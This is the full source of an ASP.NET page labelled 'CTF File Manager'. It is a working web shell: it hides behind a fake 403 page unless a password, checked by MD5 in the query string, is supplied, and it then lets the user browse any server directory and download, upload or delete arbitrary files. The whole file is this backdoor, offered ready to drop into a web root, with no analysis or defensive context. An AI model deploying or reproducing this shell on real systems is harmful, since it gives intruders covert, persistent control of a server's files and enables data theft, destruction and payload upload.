<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Text" %>

<script runat="server">
    string correctMD5 = "e662ddd93d6f72abfb31328821b595cc"; 

    string currentPath = @"C:\inetpub\wwwroot";   // Default Path

    protected void Page_Load(object sender, EventArgs e)
    {
        string inputPass = Request.QueryString["p"];

        if (string.IsNullOrEmpty(inputPass) || !VerifyMD5(inputPass, correctMD5))
        {
            Response.StatusCode = 403;
            Response.Write("<h1>403 Forbidden</h1>");
            Response.End();
        }

        // Get directory from URL or use default
        if (!string.IsNullOrEmpty(Request.QueryString["dir"]))
        {
            currentPath = Request.QueryString["dir"].Replace("..", "");
        }

        // Download
        if (Request.QueryString["action"] == "download" && !string.IsNullOrEmpty(Request.QueryString["file"]))
        {
            DownloadFile(Request.QueryString["file"]);
        }

        // Delete
        if (!string.IsNullOrEmpty(Request.QueryString["del"]))
        {
            DeleteFile(Request.QueryString["del"]);
            Response.Redirect(GetCurrentUrl() + "&msg=deleted");
        }

        if (Request.QueryString["msg"] != null)
            lblMsg.Text = "<span style='color:lime'>✅ Success!</span>";
    }

    string GetCurrentUrl()
    {
        return "?p=" + Request.QueryString["p"] + "&dir=" + Server.UrlEncode(currentPath);
    }

    bool VerifyMD5(string input, string correctHash)
    {
        using (MD5 md5 = MD5.Create())
        {
            byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
            return BitConverter.ToString(hash).Replace("-", "").ToLower() == correctHash.ToLower();
        }
    }

    void DownloadFile(string fileName)
    {
        try
        {
            string fullPath = Path.Combine(currentPath, Server.UrlDecode(fileName));
            if (File.Exists(fullPath))
            {
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition", "attachment; filename=" + Server.UrlEncode(Path.GetFileName(fullPath)));
                Response.TransmitFile(fullPath);
                Response.End();
            }
        }
        catch { }
    }

    void DeleteFile(string fileName)
    {
        try
        {
            string fullPath = Path.Combine(currentPath, Server.UrlDecode(fileName));
            if (File.Exists(fullPath)) File.Delete(fullPath);
        }
        catch { }
    }

    protected void btnUpload_Click(object sender, EventArgs e)
    {
        if (FileUpload1.HasFile)
        {
            try
            {
                string fileName = Path.GetFileName(FileUpload1.FileName);
                string savePath = Path.Combine(currentPath, fileName);
                FileUpload1.SaveAs(savePath);
                lblMsg.Text = "<span style='color:lime'>✅ Uploaded Successfully: " + fileName + "</span>";
            }
            catch (Exception ex)
            {
                lblMsg.Text = "<span style='color:red'>Upload Failed: " + ex.Message + "</span>";
            }
        }
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>CTF File Manager - inetpub</title>
    <style>
        body { font-family: Consolas, monospace; background: #0a0a0a; color: #00ff00; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #00aa00; padding: 10px; }
        th { background: #111; }
        a { color: #00ffff; text-decoration: none; }
        a:hover { color: white; }
        .dir { color: #ffff00; font-weight: bold; }
        .current-path { background:#111; padding:12px; border:1px solid #00ff00; margin:15px 0; }
    </style>
</head>
<body>
    <h1>🛠️ CTF File Manager - C:\inetpub\wwwroot</h1>

    <div class="current-path">
        <strong>Current Directory:</strong> <%= currentPath %>
        <br>
        <a href="?p=<%= Request.QueryString["p"] %>&dir=C:\inetpub\wwwroot">[ Go to Web Root ]</a>
    </div>

    <!-- Upload -->
    <div style="border:2px dashed #00ff00; padding:15px; background:#111; margin:15px 0;">
        <h2>Upload File</h2>
        <form runat="server" enctype="multipart/form-data">
            <asp:FileUpload ID="FileUpload1" runat="server" />
            <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
            <br/><br/>
            <asp:Label ID="lblMsg" runat="server" />
        </form>
    </div>

    <h2>📁 Directory Listing</h2>
    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Actions</th>
        </tr>

        <!-- Go Up -->
        <% if (currentPath.Length > 3) { %>
        <tr>
            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(Directory.GetParent(currentPath)?.FullName) %>">.. (Go Up)</a></td>
            <td>Folder</td>
            <td></td>
            <td></td>
            <td></td>
        </tr>
        <% } %>

        <% 
            // Folders
            foreach (var dir in Directory.GetDirectories(currentPath).Select(d => new DirectoryInfo(d)).OrderBy(d => d.Name))
            {
        %>
        <tr>
            <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(dir.FullName) %>"><%= dir.Name %></a></td>
            <td>Folder</td>
            <td>-</td>
            <td><%= dir.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td></td>
        </tr>
        <% } %>

        <!-- Files -->
        <% foreach (var file in Directory.GetFiles(currentPath).Select(f => new FileInfo(f)).OrderBy(f => f.Name))
           {
               string encoded = Server.UrlEncode(file.Name);
        %>
        <tr>
            <td><%= file.Name %></td>
            <td>File</td>
            <td><%= (file.Length / 1024.0).ToString("0.##") %> KB</td>
            <td><%= file.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
            <td>
                <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&action=download&file=<%= encoded %>">⬇️ Download</a> |
                <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&del=<%= encoded %>" 
                   onclick="return confirm('Delete this file?')">🗑️ Delete</a>
            </td>
        </tr>
        <% } %>
    </table>
</body>
</html>
